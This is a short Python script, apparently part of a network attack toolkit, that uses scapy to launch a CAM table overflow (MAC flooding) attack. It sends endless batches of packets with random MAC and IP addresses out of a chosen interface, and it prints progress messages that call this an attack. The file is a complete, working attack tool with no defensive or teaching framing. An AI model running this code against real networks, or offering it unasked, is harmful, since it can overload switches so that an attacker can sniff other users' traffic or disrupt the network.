from scapy.all import *
from colorama import *


def cam_table_overflow(interface):
    print(Fore.GREEN + f"    [+] CAM Table Overflow attack initiated... (Press Ctrl + C to Stop)")  # Переведено
    total = 0
    try:
        while True:
            fake_packet = (Ether(src=RandMAC(), dst=RandMAC()) /
                           IP(src=RandIP(), dst=RandIP()) /
                           TCP(sport=RandShort(), dport=80))
            sendp(fake_packet, iface=interface, count=100, verbose=False)

            total += 100
            print(Fore.GREEN + f"    [+] Packages sent: {total}", end='\r')  # Переведено
            time.sleep(0.2)

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено